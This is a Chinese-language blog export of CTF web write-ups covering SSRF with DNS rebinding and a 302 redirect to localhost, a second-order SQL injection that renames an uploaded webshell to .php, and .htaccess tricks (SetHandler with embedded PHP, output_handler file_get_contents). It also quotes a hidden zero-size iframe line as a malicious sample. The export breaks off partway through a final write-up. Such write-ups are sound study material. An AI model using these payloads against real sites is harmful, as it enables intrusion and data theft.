<h4 id="DNS-rebinding实现"><a href="#DNS-rebinding实现" class="headerlink" title="DNS rebinding实现"></a>DNS rebinding实现</h4><p>1.设置两个域名相同的A记录，每次查询随机返回一个，撞大运（没有实践过，且国内域名TTL最短为十分钟，感觉需要奇怪的国外服务TTL可以调到0才有机会）<br>2.在线工具，可以实现DNS重绑定，不过也是撞大运 <a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a><br>3.自建DNS服务器，具体内容也是参考的bendawang师傅的博客</p>
<h3 id="端口绕过"><a href="#端口绕过" class="headerlink" title="端口绕过"></a>端口绕过</h3><p>url.parse(s).port在不填端口号的时候解析出来是null<br>include比较是字符串比较，端口号用0080绕过即可</p>
<h3 id="路由绕过"><a href="#路由绕过" class="headerlink" title="路由绕过"></a>路由绕过</h3><p>不会，感觉express路由不支持编码，Unicode url编码都试过了都不行，fuzz特殊字符的话直接爆炸<br>app.py里嵌套了两层中间件，但是用起来的感觉是只有一层，不知道是不是有什么trick</p>
<pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span>extended<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span> extended<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>二次编码的结果是只解码了一次，request.get发出去的请求不会自己解码，路由收到url编码也不会解码，过不去呜呜<br>等wp了</p>
<h4 id="update"><a href="#update" class="headerlink" title="update"></a>update</h4><p>问了下rmb神仙，他又把这个题秒了<br>request.get跟踪302，和python的requests.get差不多，总觉得以前好像做过python重定向的题，这次居然没想到，呜呜<br>只需要第一次查询ip解析到docker本身，第二次访问解析到我的vps，再在我的vps上放一个重定向就可以了，可以另开端口启动服务，也就不需要端口绕过了<br>重定向一开始我傻不拉几的用js实现，写一个windows.location….<br>后来发现并不对，js抓取这个内容并不能解析这个重定向，以前用这个重定向打通了好像是因为后台有一个bot用无头浏览器，可以模仿浏览器行为就重定向成功了<br>所以应该直接在请求头里面重定向，<code>&lt;?php Header(&quot;Location:http://127.0.0.1/flag&quot; ); ?&gt;</code><br>我太垃圾了呜呜</p>
<h3 id="REMOTE-ADDR"><a href="#REMOTE-ADDR" class="headerlink" title="REMOTE_ADDR"></a>REMOTE_ADDR</h3><p>其实是一个非常愚蠢的问题。。。<br>昨天我一直在想为什么有<code>ip.isPrivate(dns) || dns != docker.ip</code>这么一个过滤要求dns查询的ip结果不是127.0.0.1且得等于自己的公网ip，我就很困惑。。既然已经是自己访问自己了，为什么要ban掉127.0.0.1却允许从公网访问自己，难道从公网自己访问自己REMOTE_ADDR就不是127.0.0.1吗</p>
<p>答案还真是就会变，所以虽然docker是把80端口映射到了8010端口，但是通过公网ip加8010端口的访问的REMOTE_ADDR就是公网ip，所以需要本地访问80端口才能打通，呜呜，我太垃圾了</p>
<p>因为请求非自身的ip肯定是要去问路由器的，就算是自己访问自己也需要跳到路由器上再跳回来，这样子访问的远端ip就变成了自己的公网ip(内网也一样)，而不是127.0.0.1<br>因此想remote_addr是127.0.0.1，就必须是直接显式的访问127.0.0.1，这样子才不会去走路由，直接访问自己</p>
<h2 id="自建DNS"><a href="#自建DNS" class="headerlink" title="自建DNS"></a>自建DNS</h2><p>注册到systemctl，快速重启，稳定不需要撞大运(虽然话是这么说，但是用起来感觉好像还是是没有想象中百发百中的稳定性)<br>写一个mydns.service放到&#x2F;etc&#x2F;systemd&#x2F;system目录下，这个是Ubuntu的路径，网上找的大部分usr目录下的那个是centOS的</p>
<pre><code>[Unit]
Description=mydns

[Service]
Type=simple
ExecStart=/root/dns_rebinding/dns_rebinding.py
ExecReload=/root/dns_rebinding/dns_rebinding.py
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.targetroot
</code></pre>
<p>写一个简单的服务功能就行，定义start restart 和 stop都执行什么命令就行<br>dns_rebinding.py就直接抄bendawang师傅博客里的脚本就行，python2运行<br>加内联注释<code>#!/usr/bin/env python2</code>改成755可执行<br>systemctl enable mydns.service<br>systemctl start mydns.service即可</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
        <tag>dns rebinding</tag>
      </tags>
  </entry>
  <entry>
    <title>[XDCTF2015] filemanager</title>
    <url>/%5BXDCTF2015%5Dfilemanager.html</url>
    <content><![CDATA[<h1 id="XDCTF2015-filemanager"><a href="#XDCTF2015-filemanager" class="headerlink" title="[XDCTF2015] filemanager"></a>[XDCTF2015] filemanager</h1><p>BUU上一个15年的题，二次注入</p>
<h2 id="源码泄漏"><a href="#源码泄漏" class="headerlink" title="源码泄漏"></a>源码泄漏</h2><p>www.tar.gz。。。我试了www.zip和robots.txt，结果源码是另一个圧缩形式<br>有用的就两个文件，upload.php和rename.php<br>提交的所有数据都被转义加了斜杠，直接注入无果，事实上测试一下就发现把文件名改成1’之类的时候，再去修改会触发二次注入</p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>看一下关键部分代码<br>rename.php</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">'oldname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">'newname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"select * from `file` where `filename`='{$req['oldname']}'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"old file doesn't exists!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">'newname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">'newname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"update `file` set `filename`='{$req['newname']}', `oldname`='{$result['filename']}' where `fid`={$result['fid']}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$re</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            exit<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$oldname</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_DIR</span><span class="token punctuation">.</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string">"extension"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$newname</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_DIR</span><span class="token punctuation">.</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">"newname"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string">"extension"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$oldname</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$oldname</span><span class="token punctuation">,</span> <span class="token variable">$newname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
</code></pre>
<p>可以看出来，实际上的文件名和数据库中的数据是分离的，而真正对文件的重命名是最后的rename函数，但仔细看oldname和newname，他们的后缀都由查询的result给出，而在upload.php中后缀只能是白名单中的几个项，所以看起来无法完成攻击<br>但是如果extension为空，那么可控的$req[“newname”]就可以重命名出任意后缀的文件，自然可以重命名出一个php来getshell<br>而这里的update语句刚好可以修改extension，$req[‘newname’]因为被转义无法完成注入，但是$result[‘filename’]如果事先构造的足够好，当其被从数据库取出时，则会发生二次注入</p>
<p>目前的思路：上传一个名为1’,extension&#x3D;’.jpg的文件，然后将其重命名为1.jpg，则在update时的语句为<code>update \</code>file` set `filename`&#x3D;’1.jpg’, `oldname`&#x3D;’1’,extension&#x3D;’’ where `fid`&#x3D;1&#96;<br>文件名变为1.jpg.jpg</p>
<p>现在我们再次重命名，将含有extension&#x3D;’’的这条result拿出来，所以提交一个oldname&#x3D;1.jpg，这样子查询语句就会把我们刚才二次注入的result取出，再令newname&#x3D;1.php，就可以将一个名为1.jpg的文件重命名为1.php，因为之前上传的那个文件名被修改后为1.jpg.jpg，因此额外上传一个名为1.jpg的shell即可</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>SQL注入真难啊，新题目的注入思路已经超乎常人，老题目的二次注入思路也挺复杂的，不拿纸笔划一划都理不清楚什么情况</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>SQLI</tag>
        <tag>二次注入</tag>
      </tags>
  </entry>
  <entry>
    <title>[XNUCA2020]笔记</title>
    <url>/%5BXNUCA2020%5D%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<h1 id="XNUCA2020-笔记"><a href="#XNUCA2020-笔记" class="headerlink" title="[XNUCA2020]笔记"></a>[XNUCA2020]笔记</h1><p>周末看了一天多一点点的XNUCA的web，太难了，比ByteCTF的web还离谱，我死了<br>今天看到放了官方wp来做笔记，本来标题想写wp的，但是自己一个题做不出来，就还是叫笔记算了</p>
<h2 id="easephp-revenge"><a href="#easephp-revenge" class="headerlink" title="easephp_revenge"></a>easephp_revenge</h2><p>这个题是我们看了最久感觉最有可能出的题，结果看了wp之后发现完全不行<br>去年这个题因为没过滤\，而\可以换行导致所有过滤无效被非预期打穿，今年直接上了超级过滤和超级padding，死了<br>我印象里这个题还上了超级disable_function列表，由于没做出来，后面也没注意ban了啥</p>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$userHome</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$num</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$userHome</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"no access to this challenge"</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'teamtoken'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'DOCUMENT_ROOT'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"/function.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'teamtoken'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">125</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"Hacker"</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"Hacker"</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"Hacker"</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">31</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">!==</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"Hacker"</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">127</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"Hacker"</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$content_blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">,</span> <span class="token string">"html"</span><span class="token punctuation">,</span> <span class="token string">"type"</span><span class="token punctuation">,</span> <span class="token string">"upload"</span><span class="token punctuation">,</span> <span class="token string">"append"</span><span class="token punctuation">,</span> <span class="token string">"prepend"</span><span class="token punctuation">,</span> <span class="token string">"log"</span><span class="token punctuation">,</span> <span class="token string">"script"</span><span class="token punctuation">,</span> <span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"include"</span><span class="token punctuation">,</span> <span class="token string">"zend"</span><span class="token punctuation">,</span> <span class="token string">"htaccess"</span><span class="token punctuation">,</span> <span class="token string">"pcre"</span><span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token string">"#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$content_blacklist</span> <span class="token keyword">as</span> <span class="token variable">$keywords</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$keywords</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"Hacker"</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$filename_whitelist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$append_string</span> <span class="token operator">=</span> <span class="token string">"\nhope no unintended\nhope no unintended\nhope no unintended\n"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/icq[0-9a-f]{29}/"</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">checkToken</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_search</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$filename_whitelist</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token punctuation">.</span> <span class="token variable">$append_string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"use your valid teamtoken in icq, and you only have 30 times submit your payload."</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"Hacker"</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
</code></pre>
<p>过滤都不是特别的关键，限制了payload长度，限制了文件名只能是.htaccess，不允许有特殊字符，ban掉了一些常用的payload，但这都不要命，最要命的是ban了注释符和\，以及长达三次换行的致命padding</p>
<p>还设置了Apache的规则不能访问htaccess<br>仅仅ban掉htaccess和注释符是不能阻止我的，可以用通配符匹配所有文件允许访问htaccess，再setHandler全部当做PHP解析，再把一句话木马作为一条指令的多余参数传入，但是，无敌的padding就是去不掉<br>查到了有&lt;if&gt;这种类型的标签，如果不满足条件不执行if内的语句htaccess就不会崩，但是我不能闭合标签。所以单标签也打不通，死了，跑路不做了，我的payload就终止于这一步，还挺短的</p>
<pre><code>&lt;Files *&gt;
Require all granted
&lt;/Files&gt;
SetHandler application/x-httpd-php
RewriteRule 1 2 [L] &lt;?=phpinfo();?&gt;
</code></pre>
<h3 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h3><p>后来给了个Windows的提示但是我真的不会啊。。。。<br>神仙发言，我发现了一个奇怪的恶意文件，它会让Windows defender的行为从删除整个恶意文件变为删除文件从恶意代码出现到结尾的部分，通过这个payload来删除后面填充的无意义行<del>还有这种事？</del>然后说是在最新Windows上测又变成删掉整个文件了，刚才想移动这个md的时候就报毒了，处理方法比平常多了一项，原来只有删除允许，现在加了个清除威胁（我估计这个选项就是从恶意代码开始删到结束，不敢点，点了我辛辛苦苦写的md就没了）<br><code>&lt;iframe src=&quot;http://www.52CPS.COM/goto/mm.Htm&quot; width=0 height=0&gt;&lt;/iframe&gt;</code><br>也就是开了一个iframe导入了一个看不见的框，并且现在有超级同源策略，好像也没有什么太大的威胁，但是因为iframe宽高调的是0所以必然恶意啊</p>
<p>然后因为ban了一大堆的关键字，所以官方希望使用PHP的一项配置<code>output_handler</code>指定输出用什么函数处理，而这里在文件名不是htaccess的时候输出文件名，把输出用file_get_contents处理，这样子就获取flag值了<br>（如果能处理掉那个padding，我上面这个sethandler感觉也没什么问题<br>在htaccess中配置PHP设置时要在前面添加<code>php\_value</code><br>即<code>php_value output_handler file_get_contents</code></p>
<p>剩下的题，就看了一个ooooooldjs，不会，完全看不懂怎么打，但是这个是web里唯一有解的题，我跑路的时候就四个解，可以见得XNUCA的web有多离谱<del>好像比赛结束也就四个解？</del><br>摆明了是原型链污染但是我在哪污染都没找到，果断跑路，事后看wp因为当初没太认真看逻辑现在也看不懂，没时间了我跑路了</p>
<p>收藏一个估计再也不会看的wp链接<br><a href="https://github.com/NeSE-Team/XNUCA2020Qualifier/tree/main/Web">https://github.com/NeSE-Team/XNUCA2020Qualifier/tree/main/Web</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>htaccess</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>XNUCA 2019 ezphp</title>
    <url>/%5BXNUCA%5Dezphp.html</url>
    <content><![CDATA[<h1 id="XNUCA-2019-ezphp"><a href="#XNUCA-2019-ezphp" class="headerlink" title="[XNUCA 2019] ezphp"></a>[XNUCA 2019] ezphp</h1><p>去年XNUCA的一个题，因为一个点死扣了两天，docker配置Apache配置全都重新研究了一般，开端口防火墙全都整了一遍呜呜呜</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string">"fl3g.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
